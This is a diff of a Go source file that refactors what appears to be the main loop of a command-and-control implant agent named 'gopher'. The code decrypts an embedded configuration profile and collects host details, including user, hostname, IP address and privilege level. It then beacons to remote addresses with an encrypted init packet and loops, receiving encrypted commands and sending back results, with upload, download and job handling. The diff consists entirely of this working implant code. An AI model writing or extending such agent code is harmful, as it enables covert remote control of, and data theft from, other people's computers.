@@ -1,16 +1,13 @@
 package main
 
 import (
-	"crypto/aes"
-	"crypto/cipher"
 	"crypto/rand"
 	"crypto/tls"
 	"crypto/x509"
 	"encoding/binary"
-	"fmt"
 	"github.com/vmihailenco/msgpack/v5"
 	"gopher/functions"
-	"io"
+	"gopher/utils"
 	"net"
 	"os"
 	"os/user"
@@ -19,55 +16,7 @@ import (
 	"time"
 )
 
-var (
-	ACTIVE = true
-)
-
-func EncryptData(data []byte, key []byte) ([]byte, error) {
-	block, err := aes.NewCipher(key)
-	if err != nil {
-		return nil, err
-	}
-
-	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return nil, err
-	}
-
-	nonce := make([]byte, gcm.NonceSize())
-	_, err = io.ReadFull(rand.Reader, nonce)
-	if err != nil {
-		return nil, err
-	}
-	ciphertext := gcm.Seal(nonce, nonce, data, nil)
-
-	return ciphertext, nil
-}
-
-func DecryptData(data []byte, key []byte) ([]byte, error) {
-	block, err := aes.NewCipher(key)
-	if err != nil {
-		return nil, err
-	}
-
-	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return nil, err
-	}
-
-	nonceSize := gcm.NonceSize()
-	if len(data) < nonceSize {
-		return nil, fmt.Errorf("ciphertext too short")
-	}
-
-	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
-
-	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
-	if err != nil {
-		return nil, err
-	}
-	return plaintext, nil
-}
+var ACTIVE = true
 
 func CreateInfo() ([]byte, []byte) {
 	var (
@@ -100,16 +49,20 @@ func CreateInfo() ([]byte, []byte) {
 		}
 	}
 
+	acp, oemcp := functions.GetCP()
+
 	randKey := make([]byte, 16)
 	_, _ = rand.Read(randKey)
 
-	info := SessionInfo{
+	info := utils.SessionInfo{
 		Process:    path,
 		PID:        os.Getpid(),
 		User:       username,
 		Host:       host,
 		Ipaddr:     ip,
 		Elevated:   functions.IsElevated(),
+		Acp:        acp,
+		Oem:        oemcp,
 		Os:         runtime.GOOS,
 		OSVersion:  osVersion,
 		EncryptKey: randKey,
@@ -120,16 +73,15 @@ func CreateInfo() ([]byte, []byte) {
 	return data, randKey
 }
 
-var profile Profile
+var profile utils.Profile
 var AgentId uint32
 var encKey []byte
-var sKey []byte
 
 func main() {
 
 	encKey = encProfile[:16]
 	encProfile = encProfile[16:]
-	encProfile, _ = DecryptData(encProfile, encKey)
+	encProfile, _ = utils.DecryptData(encProfile, encKey)
 
 	err := msgpack.Unmarshal(encProfile, &profile)
 	if err != nil {
@@ -137,19 +89,19 @@ func main() {
 	}
 
 	sessionInfo, sessionKey := CreateInfo()
-	sKey = sessionKey
+	utils.SKey = sessionKey
 
 	r := make([]byte, 4)
 	_, _ = rand.Read(r)
 	AgentId = binary.BigEndian.Uint32(r)
 
-	initData, _ := msgpack.Marshal(InitPack{Id: uint(AgentId), Type: profile.Type, Data: sessionInfo})
-	initMsg, _ := msgpack.Marshal(StartMsg{Type: INIT_PACK, Data: initData})
-	initMsg, _ = EncryptData(initMsg, encKey)
+	initData, _ := msgpack.Marshal(utils.InitPack{Id: uint(AgentId), Type: profile.Type, Data: sessionInfo})
+	initMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.INIT_PACK, Data: initData})
+	initMsg, _ = utils.EncryptData(initMsg, encKey)
 
 	UPLOADS = make(map[string][]byte)
-	DOWNLOADS = make(map[string]Connection)
-	JOBS = make(map[string]Connection)
+	DOWNLOADS = make(map[string]utils.Connection)
+	JOBS = make(map[string]utils.Connection)
 
 	addrIndex := 0
 	for i := 0; i < profile.ConnCount && ACTIVE; i++ {
@@ -192,32 +144,32 @@ func main() {
 
 		/// Recv Banner
 		if profile.BannerSize > 0 {
-			_, err := connRead(conn, profile.BannerSize)
+			_, err := functions.ConnRead(conn, profile.BannerSize)
 			if err != nil {
 				continue
 			}
 		}
 
 		/// Send Init
-		sendMsg(conn, initMsg)
+		_ = functions.SendMsg(conn, initMsg)
 
 		/// Recv Command
 
 		var (
-			inMessage  Message
-			outMessage Message
+			inMessage  utils.Message
+			outMessage utils.Message
 			recvData   []byte
 			sendData   []byte
 		)
 
 		for ACTIVE {
-			recvData, err = recvMsg(conn)
+			recvData, err = functions.RecvMsg(conn)
 			if err != nil {
 				break
 			}
 
-			outMessage = Message{Type: 0}
-			recvData, err = DecryptData(recvData, sessionKey)
+			outMessage = utils.Message{Type: 0}
+			recvData, err = utils.DecryptData(recvData, sessionKey)
 			if err != nil {
 				break
 			}
@@ -233,55 +185,8 @@ func main() {
 			}
 
 			sendData, _ = msgpack.Marshal(outMessage)
-			sendData, _ = EncryptData(sendData, sessionKey)
-			sendMsg(conn, sendData)
+			sendData, _ = utils.EncryptData(sendData, sessionKey)
+			_ = functions.SendMsg(conn, sendData)
 		}
 	}
-}
-
-func connRead(conn net.Conn, size int) ([]byte, error) {
-	if size <= 0 {
-		return nil, fmt.Errorf("incorrected size: %d", size)
-	}
-
-	message := make([]byte, 0, size)
-	tmpBuff := make([]byte, 1024)
-	readSize := 0
-
-	for readSize < size {
-		toRead := size - readSize
-		if toRead < len(tmpBuff) {
-			tmpBuff = tmpBuff[:toRead]
-		}
-
-		n, err := conn.Read(tmpBuff)
-		if err != nil {
-			return nil, err
-		}
-
-		message = append(message, tmpBuff[:n]...)
-		readSize += n
-	}
-	return message, nil
-}
-
-func recvMsg(conn net.Conn) ([]byte, error) {
-	bufLen, err := connRead(conn, 4)
-	if err != nil {
-		return nil, err
-	}
-	msgLen := binary.BigEndian.Uint32(bufLen)
-
-	return connRead(conn, int(msgLen))
-}
-
-func sendMsg(conn net.Conn, data []byte) {
-	if conn == nil {
-		return
-	}
-
-	msgLen := make([]byte, 4)
-	binary.BigEndian.PutUint32(msgLen, uint32(len(data)))
-	message := append(msgLen, data...)
-	_, _ = conn.Write(message)
 }
